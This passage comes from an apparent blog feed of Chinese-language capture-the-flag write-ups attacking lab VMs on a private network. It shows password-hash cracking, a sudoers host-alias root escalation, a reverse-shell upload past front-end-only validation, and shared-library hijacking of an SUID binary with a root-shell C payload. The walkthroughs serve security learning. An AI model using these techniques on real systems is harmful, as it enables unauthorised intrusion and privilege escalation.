Warning: detected hash type 'sha512crypt', but the string is also recognized as 'HMAC-SHA256'
Use the '--format=HMAC-SHA256' option to force loading these as that type instead
Warning: detected hash type 'sha512crypt', but the string is also recognized as 'HMAC-SHA512'
Use the '--format=HMAC-SHA512' option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexis15         (eecho)     
1g 0:00:00:01 DONE (2025-07-11 06:00) 0.5263g/s 26947p/s 26947c/s 26947C/s truckin..choccy
Use the '--show' option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cat hash
eecho:$6$mL.9/fVsBqItNR..$GyJfKOjLcovjApxygZ79CjKcqJmJ37jC8y9KeLq81fLAnNCYVP1Nw9d8Dp9pZi/l3CWJ3PHL1l/Hld3sFmZoQ.
             
```

ÁôªÂΩï

```
www-data@Sudo:/opt$ su eecho
su eecho
Password: alexis15
id
uid=1000(eecho) gid=1000(eecho) groups=1000(eecho)
echo $0
bash
```

Á®≥Âõ∫

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

ÁúãÁúãÊúâÊ≤°Êúâ‰ø°ÊÅØ

```
eecho@Sudo:~$ ls -al
total 24
drwxr-xr-x 2 eecho eecho 4096 Jul  9 04:42 .
drwxr-xr-x 3 root  root  4096 Jul  9 04:41 ..
lrwxrwxrwx 1 root  root     9 Jul  9 04:42 .bash_history -&gt; /dev/null
-rw-r--r-- 1 eecho eecho  220 Jul  9 04:41 .bash_logout
-rw-r--r-- 1 eecho eecho 3526 Jul  9 04:41 .bashrc
-rw-r--r-- 1 eecho eecho  807 Jul  9 04:41 .profile
-rw-r--r-- 1 root  root    44 Jul  9 04:42 user.txt
eecho@Sudo:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for eecho: 
Sorry, user eecho may not run sudo on Sudo.
```

ÂïäËøôÔºåÊàëËøò‰ª•‰∏∫Âá∫sudoÈ¢òÂë¢Ôºå‰∏çÊòØÈÇ£Â∞±ÊòØreadÈÇ£‰∏™ÊúâÈóÆÈ¢ò
Â±ÖÁÑ∂Èù∂Êú∫Âè´sudoÔºå‰∏çÊòØsudo -lÔºåÈÇ£‰ºö‰∏ç‰ºöÊòØ/etc/sudoersÊúâÈóÆÈ¢ò

ÁúãÁúã

```
eecho@Sudo:~$ /usr/bin/read_file -f /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL
eecho Dashazi = NOPASSWD:ALL
# See sudoers(5) for more information on '@include' directives:

@includedir /etc/sudoers.d
```

ËøòÁúüÊòØ

ÂÆÉÈúÄË¶ÅDashaziÁöÑ‰∏ªÊú∫Âà´ÂêçÊâçÁîüÊïà

```
eecho@Sudo:~$ hostname
Sudo
eecho@Sudo:~$ sudo -h Dashazi /bin/bash
sudo: unable to resolve host Dashazi: Name or service not known
root@Sudo:/home/eecho# id
uid=0(root) gid=0(root) groups=0(root)
root@Sudo:/home/eecho# cat /root/root.txt 
flag{root}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sudo.html</guid><pubDate>Fri, 11 Jul 2025 13:32:15 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_sML</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sML.html</link><description>![image-20250710215549207](https://7r1umphk.github.io/image/20250710215556665.webp)

Â§çÁõò‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ sudo arp-scan -l  
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.174 08:00:27:a4:3b:3c       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ nmap -p- 192.168.205.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 09:56 EDT
Nmap scan report for 192.168.205.174
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:A4:3B:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
                            
```

Áúãweb

![image-20250710215727831](https://7r1umphk.github.io/image/20250710215727984.webp)

ËØï‰∫Ü‰∏Ä‰∏ãÂº±ÂØÜÁ†ÅÔºåÂèëÁé∞ÂèØ‰ª•ÁàÜÁ†¥user

![image-20250710215818476](https://7r1umphk.github.io/image/20250710215818575.webp)

ÁàÜÁ†¥ÁöÑÂêåÊó∂Áúã‰∫Ü‰∏Ä‰∏ãÊ∫êÁ†ÅÔºåÂèëÁé∞‰∫Ü‰ªñÊòØ‰ΩøÁî®ÁöÑÊ®°Êùø

![image-20250710215849837](https://7r1umphk.github.io/image/20250710215850057.webp)

‰∏ãËΩΩ‰∏Ä‰ªΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ wget https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
--2025-07-10 09:59:34--  https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
Ê≠£Âú®Ëß£Êûê‰∏ªÊú∫ www.sourcecodester.com (www.sourcecodester.com)... 172.67.190.48, 104.21.19.206, 2606:4700:3030::ac43:be30, ...
Ê≠£Âú®ËøûÊé• www.sourcecodester.com (www.sourcecodester.com)|172.67.190.48|:443... Â∑≤ËøûÊé•„ÄÇ
Â∑≤ÂèëÂá∫ HTTP ËØ∑Ê±ÇÔºåÊ≠£Âú®Á≠âÂæÖÂõûÂ∫î... 200 OK
ÈïøÂ∫¶Ôºö1391869 (1.3M) [application/zip]
Ê≠£Âú®‰øùÂ≠òËá≥: ‚Äúemployee_records_system.zip‚Äù

employee_records_system.zip                  100%[============================================================================================&gt;]   1.33M   200KB/s  Áî®Êó∂ 6.8s    

2025-07-10 09:59:44 (200 KB/s) - Â∑≤‰øùÂ≠ò ‚Äúemployee_records_system.zip‚Äù [1391869/1391869])

                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ unzip employee_records_system.zip
Archive:  employee_records_system.zip
   creating: employee_records_system/css/
  inflating: employee_records_system/css/font-awesome.css  
  inflating: employee_records_system/css/font-awesome.min.css  
   creating: employee_records_system/css/images/
  inflating: employee_records_system/css/images/ui-icons_444444_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_555555_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_777620_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_777777_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_cc0000_256x240.png  
  inflating: employee_records_system/css/images/ui-icons_ffffff_256x240.png  
  inflating: employee_records_system/css/jquery-ui.css  
  inflating: employee_records_system/css/style.css  
   creating: employee_records_system/dashboard/
  inflating: employee_records_system/dashboard/add_employee.php  
  inflating: employee_records_system/dashboard/add_user.php  
  inflating: employee_records_system/dashboard/addemployee.php  
  inflating: employee_records_system/dashboard/adduser.php  
  inflating: employee_records_system/dashboard/current_employees.php  
  inflating: employee_records_system/dashboard/edit_employee.php  
  inflating: employee_records_system/dashboard/editemployee.php  
  inflating: employee_records_system/dashboard/getData.php  
  inflating: employee_records_system/dashboard/index.php  
  inflating: employee_records_system/dashboard/logout.php  
  inflating: employee_records_system/dashboard/past_employees.php  
  inflating: employee_records_system/dashboard/retrievedata.php  
  inflating: employee_records_system/dashboard/settings.php  
  inflating: employee_records_system/dashboard/uploadID.php  
  inflating: employee_records_system/dashboard/uploadimage.php  
   creating: employee_records_system/database file/
  inflating: employee_records_system/database file/sharp_db.sql  
   creating: employee_records_system/fonts/
  inflating: employee_records_system/fonts/FontAwesome.otf  
  inflating: employee_records_system/fonts/fontawesome-webfont.eot  
  inflating: employee_records_system/fonts/fontawesome-webfont.svg  
  inflating: employee_records_system/fonts/fontawesome-webfont.ttf  
  inflating: employee_records_system/fonts/fontawesome-webfont.woff  
  inflating: employee_records_system/fonts/fontawesome-webfont.woff2  
   creating: employee_records_system/images/
  inflating: employee_records_system/images/body_bg.jpg  
  inflating: employee_records_system/images/logo.png  
  inflating: employee_records_system/images/print.png  
  inflating: employee_records_system/images/times.png  
   creating: employee_records_system/inc/
  inflating: employee_records_system/inc/db_connect.php  
  inflating: employee_records_system/inc/header.php  
  inflating: employee_records_system/index.php  
   creating: employee_records_system/js/
  inflating: employee_records_system/js/global.js  
  inflating: employee_records_system/js/jquery.mask.js  
  inflating: employee_records_system/js/jquery.min.js  
  inflating: employee_records_system/js/jquery-ui.min.js  
   creating: employee_records_system/phpclasses/
  inflating: employee_records_system/phpclasses/pagination.php  
  inflating: employee_records_system/READme.md  
   creating: employee_records_system/uploads/
   creating: employee_records_system/uploads/employees_ids/
  inflating: employee_records_system/uploads/employees_ids/76xq1kHzYEaSZum_47446233-clean-noir-et-gradient-sombre-image-de-fond-abstrait-.jpg  
  inflating: employee_records_system/uploads/employees_ids/JeytInUiX9OuLEx_no-image-available.png  
   creating: employee_records_system/uploads/employees_photos/
  inflating: employee_records_system/uploads/employees_photos/G2IHhlrobeUFmQB_ava.jpg  
  inflating: employee_records_system/uploads/employees_photos/i0e2fodkG79IDU8_ava.jpg  
  inflating: employee_records_system/uploads/employees_photos/ZtYMgxRNGcFn9SQ_avatar.jpg  
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cd employee_records_system 
                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/employee_records_system]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 25
drwxr-xr-x 1 kali kali 4096  7Êúà10Êó• 09:59  .
drwxr-xr-x 1 kali kali 8192  7Êúà10Êó• 09:59  ..
drwxr-xr-x 1 kali kali    0 2017Âπ¥ 5Êúà21Êó•  css
drwxr-xr-x 1 kali kali 4096 2017Âπ¥ 5Êúà21Êó•  dashboard
drwxr-xr-x 1 kali kali    0 2017Âπ¥ 5Êúà21Êó• 'database file'
drwxr-xr-x 1 kali kali 4096 2017Âπ¥ 5Êúà21Êó•  fonts
drwxr-xr-x 1 kali kali    0 2017Âπ¥ 5Êúà21Êó•  images
drwxr-xr-x 1 kali kali    0 2017Âπ¥ 5Êúà21Êó•  inc
-rwxr-xr-x 1 kali kali 4037 2021Âπ¥ 2Êúà24Êó•  index.php
drwxr-xr-x 1 kali kali    0 2017Âπ¥ 5Êúà21Êó•  js
drwxr-xr-x 1 kali kali    0 2017Âπ¥ 5Êúà21Êó•  phpclasses
-rwxr-xr-x 1 kali kali  598 2017Âπ¥ 5Êúà21Êó•  READme.md
drwxr-xr-x 1 kali kali    0 2017Âπ¥ 5Êúà21Êó•  uploads
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/employee_records_system]
‚îî‚îÄ$ cd 'database file'        
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/x/tmp/employee_records_system/database file]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 7
drwxr-xr-x 1 kali kali    0 2017Âπ¥ 5Êúà21Êó• .
drwxr-xr-x 1 kali kali 4096  7Êúà10Êó• 09:59 ..
-rwxr-xr-x 1 kali kali 2411 2021Âπ¥ 2Êúà24Êó• sharp_db.sql
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/x/tmp/employee_records_system/database file]
‚îî‚îÄ$ cat sharp_db.sql  
-- phpMyAdmin SQL Dump
-- version 4.5.2
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: May 20, 2017 at 04:21 PM
-- Server version: 5.7.9
-- PHP Version: 5.6.16

SET SQL_MODE = 'NO_AUTO_VALUE_ON_ZERO';
SET time_zone = '+00:00';


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `sharp_db`
--

-- --------------------------------------------------------

--
-- Table structure for table `sharp_emp`
--

DROP TABLE IF EXISTS `sharp_emp`;
CREATE TABLE IF NOT EXISTS `sharp_emp` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `employee_id` text,
  `first_name` text NOT NULL,
  `middle_name` text,
  `last_name` text NOT NULL,
  `phone` int(11) NOT NULL,
  `employee_image` text NOT NULL,
  `id_type` text NOT NULL,
  `id_number` text NOT NULL,
  `id_card_image` text NOT NULL,
  `residence_address` text NOT NULL,
  `residence_location` text NOT NULL,
  `residence_direction` text NOT NULL,
  `residence_gps` text NOT NULL,
  `next_of_kin` text NOT NULL,
  `relationship` text NOT NULL,
  `phone_of_kin` text NOT NULL,
  `kin_residence` text NOT NULL,
  `kin_residence_direction` text NOT NULL,
  `date_employed` date NOT NULL,
  `job_type` text NOT NULL,
  `status` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `user_id` int(11) NOT NULL AUTO_INCREMENT,
  `firstname` text NOT NULL,
  `lastname` text NOT NULL,
  `username` text NOT NULL,
  `password` text NOT NULL,
  `accounttype` text NOT NULL,
  PRIMARY KEY (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`user_id`, `firstname`, `lastname`, `username`, `password`, `accounttype`) VALUES
(1, 'Maxwell', 'Morrison', 'xxx2xy', '10a55271c201e41913764ff95b33248b', 'Admin'),
(3, 'Maxwell', 'Morrison', 'admins', '02adcdf2171dc7e5757cdd7c0b91fa03', 'Admin');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
                                       
```

ÂèëÁé∞‰∫Ü‰∏§‰∏™Áî®Êà∑ÔºåÂíåÂØÜÁ†ÅÂìàÂ∏åÔºàËøô‰∏™ÂØÜÁ†ÅhashÁõ¥Êé•ÊãøÂéªjohnÁàÜÁ†¥‰∏çÂá∫Êù•ÔºåÂõ†‰∏∫ÂÆÉÊòØ(MD5(MD5(password)+MD5(username)))ËøôÁßçÊû∂ÊûÑÔºåËøôÈáåÊàëÊ≤°ÊúâÂ∞ùËØï‰Ω†‰ª¨ÂèØ‰ª•Â∞ùËØï‰∏Ä‰∏ãÔºåËøòË¶ÅÁæ§ÈáåÁöÑ‰Ω¨ËØ¥Êúâ‰∏Ä‰∏™pocÂèØ‰ª•Âà©Áî®ÔºåÊàë‰πüÊ≤°ÊúâÂ∞ùËØïÔºåÊÑüÂÖ¥Ë∂£ÁöÑÂèØ‰ª•Áúã‰∏Ä‰∏ã`https://www.exploit-db.com/exploits/49596`ÔºâÔºåÁÑ∂ÂêéÊàëÂ∞±Áõ¥Êé•ÊãøadminsÁî®Êà∑ÂéªburpÁàÜÁ†¥ÂØÜÁ†Å‰∫ÜÔºåÂõ†‰∏∫ÂÆÉÊòØÈªòËÆ§ÂØÜÁ†ÅÔºåËÄå‰∏îËøô‰∏™Ê®°ÊùøÂ•ΩÂÉèÊòØ8Âπ¥ÂâçÁöÑÔºåÂ§ßÊ¶ÇÁéáÊòØÂº±ÂØÜÁ†ÅÊù•ÁöÑ

ÂØÜÁ†ÅÊòØadmin123

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ grep -w -n 'admin123' xato-net-10-million-passwords-100000.txt 
15582:admin123
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ grep -w -n 'admin123' rockyou.txt                             
90006:admin123
10357629:admin123*
```

Êå∫ÂêéÁöÑÔºåÊâÄ‰ª•Áõ¥Êé•ÊâìpocÊòØÊúÄÂø´ÁöÑ

Â¶ÇÊûú‰Ω†Ë∑üÊàë‰∏ÄÊ†∑ÁôªÂΩïËøõÊù•ÁöÑÔºåÁÇπadd employeeÁÑ∂ÂêéÁÖßÁâáÈÇ£ÈáåÂÖà‰º†‰∏Ä‰∏™reverse.png(ÂèçÂºπshell phpÊñá‰ª∂)‰∏äÂéªÔºåÁÑ∂ÂêéÊäìÂåÖÊîπÂêçÂ∞±Â•Ω‰∫ÜÔºåÂÆÉÂ∞±Âè™ÂÅö‰∫ÜÂâçÁ´ØÊ†°È™å

ÂºÄÊäìÂåÖ
![image-20250710221057739](https://7r1umphk.github.io/image/20250710221057836.webp)

ÊîπÂåÖ

![image-20250710221154470](https://7r1umphk.github.io/image/20250710221154732.webp)

ÊîæË°å

ÁõÆÂΩïÊâ´ÊèèÁúãÁúã‰∏ä‰º†ÁõÆÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.174 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.174
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--&gt; http://192.168.205.174/images/]
/uploads              (Status: 301) [Size: 320] [--&gt; http://192.168.205.174/uploads/]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/css                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.174/css/]
/index.php            (Status: 200) [Size: 1926]
/js                   (Status: 301) [Size: 315] [--&gt; http://192.168.205.174/js/]
/inc                  (Status: 301) [Size: 316] [--&gt; http://192.168.205.174/inc/]
/fonts                (Status: 301) [Size: 318] [--&gt; http://192.168.205.174/fonts/]
/dashboard            (Status: 301) [Size: 322] [--&gt; http://192.168.205.174/dashboard/]
Progress: 34475 / 1102800 (3.13%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 35514 / 1102800 (3.22%)
===============================================================
Finished
===============================================================
                      
```

![image-20250710221300132](https://7r1umphk.github.io/image/20250710221300285.webp)

kaliÂºÄÁõëÂê¨

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lnvp 8888           
listening on [any] 8888 ...

```

Ëß¶Âèë

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.174] 54352
Linux sML 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
 10:13:26 up 18 min,  0 users,  load average: 0.38, 0.16, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (430): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sML:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ÊâæÊèêÊùÉ

```
www-data@sML:/$ cd /h
cd /home/yulian/
www-data@sML:/home/yulian$ ls -al
ls -al
total 44
drwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .
drwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..
lrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -&gt; /dev/null
-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout
-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc
-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile
-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root
-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt
www-data@sML:/home/yulian$ cat us
cat user.txt 
flag{user-fde7951c3a57bc71b03631a9673ab67e}
www-data@sML:/home/yulian$ strings get_root
strings get_root
/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
hello
puts
__cxa_finalize
__libc_start_main
libxxoo.so
libc.so.6
GLIBC_2.2.5
/usr/lib/sML
u/UH
[]A\A]A^A_
Starting get_root program...
;*3$'
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
get_root.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
__libc_start_main@GLIBC_2.2.5
hello
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

Áæ§‰∏ªÈÇ£‰∏™xxooÁúüÊòØÂ§™ÈÜíÁõÆ‰∫Ü
![image-20250710222034547](https://7r1umphk.github.io/image/20250710222034668.webp)

ÈÇ£Â∞±Âä®ÊÄÅÈìæÊé•Â∫ìÂä´ÊåÅÂêß

```
www-data@sML:/home/yulian$ ls -al /usr/lib/sML
ls -al /usr/lib/sML
total 24
drwxr-xr-x  2 root root  4096 Jul  7 06:32 .
drwxr-xr-x 71 root root  4096 Jul  7 06:29 ..
-rwxrwxrwx  1 root root 15984 Jul  7 06:30 libxxoo.so
www-data@sML:/home/yulian$ cd /tmp
cd /tmp
www-data@sML:/tmp$ cat &lt;&lt; EOF &gt; shell.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

void hello() {
    setuid(0);
    setgid(0);
    system('/bin/bash -p');
}
EOFcat &lt;&lt; EOF &gt; shell.c
&gt; #include &lt;stdio.h&gt;
&gt; #include &lt;stdlib.h&gt;
&gt; #include &lt;unistd.h&gt;
&gt; 
&gt; void hello() {
&gt;     setuid(0);
&gt;     setgid(0);
&gt;     system('/bin/bash -p');
&gt; }
&gt; 
EOF
www-data@sML:/tmp$ gcc -shared -o libxxoo.so -fPIC shell.c
gcc -shared -o libxxoo.so -fPIC shell.c
www-data@sML:/tmp$ cp libxxoo.so /usr/lib/sML/
cp libxxoo.so /usr/lib/sML/
www-data@sML:/tmp$ cd /h 
cd /home/yulian/
www-data@sML:/home/yulian$ ls -al
ls -al
total 44
drwxr-xr-x 2 yulian yulian  4096 Jul  7 06:34 .
drwxr-xr-x 3 root   root    4096 Jul  7 06:12 ..
lrwxrwxrwx 1 root   root       9 Jul  7 06:34 .bash_history -&gt; /dev/null
-rw-r--r-- 1 yulian yulian   220 Jul  7 06:12 .bash_logout
-rw-r--r-- 1 yulian yulian  3526 Jul  7 06:12 .bashrc
-rw-r--r-- 1 yulian yulian   807 Jul  7 06:12 .profile
-rwsr-sr-x 1 root   root   16648 Jul  7 06:34 get_root
-rw-r--r-- 1 root   root      44 Jul  7 06:13 user.txt
www-data@sML:/home/yulian$ ./get_root
./get_root
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
cat /root/root.txt
flag{root-4c850c5b3b2756e67a91bad8e046ddac}
```

ÁàÜÁ†¥hashÂèÇËÄÉ‰ª£Á†Å

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat a.py           
import hashlib

def crack():
    u = 'admins'
    h = '02adcdf2171dc7e5757cdd7c0b91fa03'
    w = r'/usr/share/wordlists/rockyou.txt'

    umd5 = hashlib.md5(u.encode()).hexdigest()

    try:
        with open(w, 'r', encoding='latin-1') as f:
            for line in f:
                p = line.strip()
                pm = hashlib.md5(p.encode()).hexdigest()
                cm = hashlib.md5((pm + umd5).encode()).hexdigest()
                if cm == h:
                    print(f'[+] ÂØÜÁ†ÅÊâæÂà∞: {p}')
                    return
        print('[-] Êú™ÊâæÂà∞')
    except:
        print('Êñá‰ª∂ÈîôËØØ')

if __name__ == '__main__':
    crack()
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 a.py
[+] ÂØÜÁ†ÅÊâæÂà∞: admin123
                                                 
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sML.html</guid><pubDate>Thu, 10 Jul 2025 14:40:33 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Backdoor1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Backdoor1.html</link><description>![image-20250709215624782](https://7r1umphk.github.io/image/20250709215633404.webp)

Êâì‰∏Ä‰∏™Áù°Ëßâ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l           
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.172 08:00:27:56:2e:31       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.947 seconds (131.48 hosts/sec). 4 responded
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.172     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 09:57 EDT
Nmap scan report for 192.168.205.172
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:56:2E:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
                                                          
```

ÈÇ£Áõ¥Êé•Áúãweb

![image-20250709215805803](https://7r1umphk.github.io/image/20250709215806158.webp)

ÁñØÁãÇÊöóÁ§∫ÂêéÈó®ÔºåÂìàÂìàÂìà

Êâ´‰∏Ä‰∏ãÁõÆÂΩï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.172 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.172
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
